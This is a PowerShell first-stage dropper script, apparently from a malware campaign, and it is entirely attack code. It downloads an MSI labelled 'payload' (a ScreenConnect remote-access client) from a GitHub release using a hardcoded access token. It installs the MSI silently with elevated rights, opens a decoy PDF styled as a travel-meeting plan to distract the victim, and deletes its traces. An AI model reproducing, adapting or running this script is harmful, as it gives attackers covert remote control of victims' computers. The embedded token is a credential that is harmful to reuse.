# stage1.ps1 - MSI from GitHub release (reliable), UAC, then PDF
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$githubToken = "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"
$gh = @{"Authorization"="token $githubToken";"Accept"="application/vnd.github.v3+json"}

# === 1. Download MSI from GitHub release ===
$msiUrl = "https://github.com/slynet999-coder/Yambo/releases/download/payload/ScreenConnect.ClientSetup.msi"
$msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
try { Remove-Item $msiPath -Force } catch {}
try { Invoke-WebRequest -Uri $msiUrl -Headers $gh -OutFile $msiPath -TimeoutSec 180 } catch {}
if (-not (Test-Path $msiPath)) { exit }
if ((Get-Item $msiPath).Length -lt 1000000) { exit }

# === 2. UAC Install (msiexec directly, no EncodedCommand) ===
Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -Wait

# === 3. PDF Decoy (only after install) ===
try {
    $fi = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $gh
    $pdfPath = Join-Path $env:TEMP "Travel_Plan_Meeting_Q4_2026.pdf"
    Invoke-WebRequest -Uri $fi.download_url -Headers $gh -OutFile $pdfPath -TimeoutSec 30
    if (Test-Path $pdfPath) {
        $edge = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if (Test-Path $edge) { Start-Process $edge -ArgumentList "`"$pdfPath`"" }
    }
} catch {}

# === 4. Cleanup ===
Start-Sleep 3
try { Remove-Item $msiPath -Force } catch {}
